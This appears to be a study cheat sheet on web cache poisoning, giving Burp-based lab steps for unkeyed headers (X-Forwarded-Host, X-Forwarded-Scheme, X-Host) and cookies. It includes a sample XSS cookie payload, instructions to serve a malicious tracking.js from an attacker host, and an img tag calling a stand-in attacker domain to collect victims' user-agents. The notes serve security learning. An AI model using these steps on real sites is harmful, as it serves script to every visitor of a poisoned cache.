# Cache poisoning

## Summary
* [Web cached poisoning](#web-cached-poisoning)
* [Exploiting cache design flaws](#exploiting-cace-design-flaws)
	* [Unsafe handling of resource imports](#web-cache-poisoning-with-unsafe-handling-of-resource-imports)
	* [Cookie handling exploitation](#web-cache-poisoning-with-cookie-handling-vulnerabilities)
	* [Multiple headers exploitation](#web-cache-poisoning-with-multiple-headers)
	* [Unknown headers exploitation](#web-cache-poisoning-with-unknown-headers)

## Web-cached poisoning

 How to construct a web cache poisoning attack
```
> identify and evaluate unkeyed inputs
> elicit a harmful response from the back-end server
> get the response cached
```

 Getting informations from web-cached poisoning attack
```
> cache-control directives
	# when responses contain information about how often the cache is purged or how old the currently cached response is
		## HTTP/1.1 200 OK
		##	Via: 1.1 varnish-v4
		##	Age: 174
		##	Cache-Control: public, max-age=1800
	# vary header
		## this header specifies a list of headers that should be treated as part of the cache key even if they are normally unkeyed
```

## Exploiting cache design flaws
### Web cache poisoning with unsafe handling of resource imports
```
> assume a website imports resources from other domain
> load the website's home page and send the request to Burp
> add a cache-buster query parameter to test for unkeyed headers
> add "X-Forwarded-Host" with an arbitrary hostname such as example.com
> observe that the X-Forwarded-Host header is used to generate an absolute URL for importing resource stored at /resources/js/tracking.js
> resend the request and observe that the response contains the header X-Cache: hit meaning the response came from the cache
> in the local machine, add a new hostname with the machine's ip address
> navigate to /var/www/html and create /resources/js/tracking.js with tracking.js containing the necessary javascript payload then run a python http server
> Go back to the GET request for the home page in Burp and remove the cache-buster
> replace the previous arbitrary hostname with your machine's hostname then keep sending the request until the cache hit
> go back to the website and observe that the javascript payload is triggered each time a request is made
```

### Web cache poisoning with cookie-handling vulnerabilities
```
> assume the cookie header is unkeyed
> load the website's home page and send the request to Burp
> observe that the cookie fehost=prod-cache-01 is reflected inside a double-quoted JavaScript object in the response
> add a cache-buster query parameter and change the fehost value to arbitrary string
> observe that the string is reflected in the response
> create a suitable XSS payload to call an alert function
	# fehost=someString"-alert(1)-"someString
> remove the cache-buster and keep sending the request until the cache hit
> go back to the website and observe that the javascript payload is triggered each time a request is made
```

### Web cache poisoning with multiple headers
```
> assume a website imports resources from other domain stored at /resources/js/tracking.js
> load the GET request for /resources/js/tracking.js and send the request to Burp
> add a cache-buster query parameter to test for unkeyed headers
> add "X-Forwarded-Host" with an arbitrary hostname such as example.com
> observe that it does not has any effect on the response
> replace the 'X-Forwarded-Host' with 'X-Forwarded-Scheme' and include any value other than HTTPS then send the request
> you will get a 302 response and observe in the 'Location' header shows that you are redirected to the same URL you requested
> add the 'X-Forwarded-Host: example.com' header back to the request and send the request
> observe the 'Location' header shows that you are redirected to 'https://example.com/resources/js/tracking.js'
> change the 'X-Forwarded-Host' value to an attacker domain which already has the /resources/js/tracking.js hosted with tracking.js containing the necessary payload
> remove the cache-buster and send the request until the cache hit
> go back to the website and observe that the payload is triggered each time a request is made
```

### Web cache poisoning with unknown headers
```
> assume a website imports resources from other domain stored at /resources/js/tracking.js
> load the GET request for / and send the request to Burp
> in Burp HTTP history, right click on the request and select "Guest headers".
> the Param Miner report says there is a secret input in the form of "X-Host"
> send the GET request for / to repeater
> add a cache-buster query parameter and add "X-Host: example.com" as additional header then send the request
> observe that the X-Host header is used to generate an absolute URL for importing resource stored at /resources/js/tracking.js
> change the X-Host value to an attacker domain which already has the /resources/js/tracking.js hosted with tracking.js containing the necessary payload then keep sending the request until the cache hit
> right click on the request and copy the URL to see if the payload is successful
> to target a victim with a specific User-Agent, post a comment in one of the blog post containing '<img src="http://attacker.domain/"/>' to get the victim users when the view the comment
> open the attacker domain access logs to see the victim's user-agent
> copy the user-agent and replace with the original user-agent in the request 
> remove the cache-buster and keep sending the request until the cache hits
> go back to the website and observe that the payload is successful
```
